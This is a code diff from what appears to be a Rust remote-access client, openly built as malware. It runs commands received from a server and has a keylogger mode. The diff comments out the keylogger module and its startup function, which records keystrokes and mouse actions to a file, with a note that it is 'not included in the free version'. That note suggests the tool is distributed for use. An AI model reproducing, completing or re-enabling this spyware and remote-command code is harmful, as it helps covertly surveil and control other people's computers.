@@ -5,7 +5,7 @@ use std::process::Output;
 use std::env;
 
 use clap::{App, Arg};
-mod keylogger;
+// mod keylogger; // not included in the free version ;)
 
 fn executecmd(cmd: &str) -> String {
     let client_os: (&str, &str);
@@ -266,7 +266,7 @@ async fn main() {
             let mut buffer:Vec<u8> = Vec::new();
             println!("recieved from server in logger mode 1: {}", String::from_utf8_lossy(&buffer).trim());
             println!("starting logger ...");
-            startlog();
+            //startlog();
             continue;
         }
         
@@ -279,20 +279,20 @@ async fn main() {
     client.shutdown(Shutdown::Both);
 }
 
-async fn startlog() {
-    let matches = App::new("keylogger")
-        .version("0.1.2")
-        .author("yourcomputer")
-        .about("Register various user actions - keystrokes on the computer keyboard, movements and mouse keystrokes")
-        .arg(
-            Arg::with_name("PATH")
-                .help("File path")
-                .index(1),
-        )
-        .get_matches();
+// async fn startlog() {
+//     let matches = App::new("keylogger")
+//         .version("0.1.2")
+//         .author("yourcomputer")
+//         .about("Register various user actions - keystrokes on the computer keyboard, movements and mouse keystrokes")
+//         .arg(
+//             Arg::with_name("PATH")
+//                 .help("File path")
+//                 .index(1),
+//         )
+//         .get_matches();
 
-    let path = matches.value_of("PATH").unwrap_or(".keylogger");
+//     let path = matches.value_of("PATH").unwrap_or(".keylogger");
 
-    keylogger::run(String::from(path));
-}
+//     keylogger::run(String::from(path));
+// }
 
